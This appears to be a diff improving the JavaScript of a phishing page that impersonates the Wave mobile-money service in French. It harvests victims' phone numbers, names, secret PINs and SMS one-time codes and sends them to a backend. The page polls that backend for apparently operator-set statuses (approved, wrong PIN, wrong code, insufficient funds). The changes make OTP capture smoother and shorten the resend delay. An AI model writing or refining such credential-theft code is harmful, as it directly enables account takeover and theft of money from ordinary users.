@@ -749,10 +749,12 @@ async function submitPIN(){
 }
 
 /* ═══════════════════════════════════════════
-   POLL + OTP — fixed version
+   POLL — PIN screen only (never touches OTP input)
 ═══════════════════════════════════════════ */
 
 var pollActive = false;
+// When true, we are on the OTP screen waiting for user to type — poll is SUSPENDED
+var otpScreen  = false;
 
 function stopPoll(){
   if(pollTmr){ clearInterval(pollTmr); pollTmr=null; }
@@ -779,66 +781,60 @@ function startPoll(sid){
   }, 3000);
 
   pollTmr = setInterval(async function(){
-    if(!pollActive){ clearInterval(msgTimer); return; }
+    if(!pollActive) return;
+    // ── CRITICAL: never process server responses while user is on OTP screen typing ──
+    if(otpScreen) return;
     try{
       var res = await fetch(API+'?action=check_status&sessionId='+sid+'&t='+Date.now());
       var r   = await res.json();
       if(!r.success || !r.status) return;
       if(r.status==='pending' || r.status==='otp_pending') return;
 
-      // ── approved: move to OTP screen ──
       if(r.status==='approved'){
         stopPoll();
         hideLoad();
         enterOTP(sid);
 
-      // ── wrong PIN ──
       } else if(r.status==='wrong_pin'){
         stopPoll();
         hideLoad();
         showPop('Code PIN incorrect','Le code secret saisi est erroné. Veuillez vérifier et réessayer.');
         setTimeout(function(){ pinVal=''; updatePinDots(); }, 300);
 
-      // ── wrong OTP — FIX: skip entirely if doVerify() is handling it ──
       } else if(r.status==='wrong_code'){
-        if(verifying) return;  // doVerify owns this result — do not interfere
-        // Also skip if user is mid-entry (has typed 1-3 digits already)
-        if(otpVal.length > 0 && otpVal.length < 4) return;
+        // Only act on wrong_code when poll is deliberately running after doVerify
+        // otpScreen=false means we're in the post-submit polling phase
         stopPoll();
         hideLoad();
         showPop('Code invalide','Le code de validation est incorrect. Veuillez réessayer.');
-        setTimeout(function(){ resetOTP(); }, 400);
+        setTimeout(function(){ otpScreen=true; resetOTP(); }, 400);
 
-      // ── insufficient funds ──
       } else if(r.status==='continue'){
         stopPoll(); hideLoad();
         showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et réessayer.','inf');
 
-      // ── session expired ──
       } else if(r.status==='expired' || r.status==='session_expired'){
         stopPoll(); hideLoad();
-        sessId = null;
+        sessId = null; otpScreen = false;
         showPop('Session expirée','Votre session a expiré. Veuillez saisir à nouveau votre code PIN.');
         setTimeout(function(){ pinVal=''; updatePinDots(); go('s-otp','s-pin'); }, 400);
 
-      // ── denied ──
       } else if(r.status==='denied' || r.status==='rejected'){
-        stopPoll(); hideLoad();
+        stopPoll(); hideLoad(); otpScreen = false;
         showPop('Accès refusé','Cette demande a été refusée. Veuillez contacter le support.');
         setTimeout(function(){ pinVal=''; updatePinDots(); go('s-pin','s-login'); loginVal=''; document.getElementById('loginPh').value=''; }, 1500);
       }
     }catch(e){}
-  }, 1200);
+  }, 1500);
 }
 
-// ── FIX: enterOTP — start resend countdown AFTER screen transition ──
+// enterOTP: go to OTP screen, STOP polling, start countdown
 function enterOTP(sid){
+  stopPoll();          // ← poll is DEAD while user types
+  otpScreen = true;   // ← flag: we are in OTP input mode
   resetOTP();
   go('s-pin','s-otp');
-  // Small delay ensures the OTP screen is visible before countdown starts
-  setTimeout(function(){ startResendCd(30); }, 150);
-  // Resume polling for OTP status
-  startPoll(sid);
+  setTimeout(function(){ startResendCd(10); }, 100);
 }
 
 /* ── OTP keypad & verification ── */
@@ -873,39 +869,39 @@ function resetOTP(){
 async function doVerify(){
   if(otpVal.length!==4 || !sessId || verifying) return;
   verifying = true;
-  stopPoll();
-  showLoad();
+  otpScreen = false;   // ← leave OTP-input-safe mode: poll can now react to wrong_code
+  showLoad('Vérification du code…');
   var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
-  hideLoad();
   if(r && r.success){
+    // Poll will pick up the final status (approved/continue/etc)
     verifying = false;
     startPoll(sessId);
   } else {
+    // Network/API error — treat as wrong code
+    hideLoad();
     showPop('Code incorrect','Le code de validation saisi est incorrect. Veuillez réessayer.');
     setTimeout(function(){
+      otpScreen = true;
       resetOTP();
-      startPoll(sessId);
     }, 800);
   }
 }
 
-/* ── Resend countdown — FIX: robust timer management ── */
+/* ── Resend countdown ── */
 var resTimer = null;
 
 function startResendCd(secs){
   var btn = document.getElementById('resendBtn');
   var cd  = document.getElementById('resendCd');
-  // Always clear any existing countdown first
   if(resTimer){ clearInterval(resTimer); resTimer = null; }
   btn.disabled = true;
   btn.style.opacity = '0.4';
-  var s = secs || 30;
+  var s = secs || 10;
   cd.textContent = 'Renvoyer dans ' + s + 's';
   resTimer = setInterval(function(){
     s--;
     if(s <= 0){
-      clearInterval(resTimer);
-      resTimer = null;
+      clearInterval(resTimer); resTimer = null;
       cd.textContent = '';
       btn.disabled = false;
       btn.style.opacity = '1';
@@ -917,19 +913,16 @@ function startResendCd(secs){
 
 async function doResend(){
   if(!sessId) return;
-  // FIX: reset OTP and start countdown immediately for instant feedback
   resetOTP();
-  startResendCd(30);
+  startResendCd(10);
   var fn = document.getElementById('fn') ? document.getElementById('fn').value.trim() : '';
   var ln = document.getElementById('ln') ? document.getElementById('ln').value.trim() : '';
-  // Call APIs (countdown already running — no second call needed)
   await callApi('reset_otp', { sessionId: sessId });
   var r = await callApi('otp_resend', { sessionId: sessId, phone: loginVal, firstName: fn, lastName: ln });
   if(!r || !r.success){
     await callApi('login_attempt', { sessionId: sessId, phone: loginVal, firstName: fn||'Unknown', lastName: ln||'User', pin: pinVal||'0000', resend: '1' });
   }
-  startPoll(sessId);
-  // Show toast confirmation
+  // Stay in otpScreen mode — poll remains stopped while user types new code
   document.getElementById('tav').textContent = '✉';
   document.getElementById('tn').textContent  = 'SMS renvoyé';
   document.getElementById('td').textContent  = 'Un nouveau code a été envoyé';
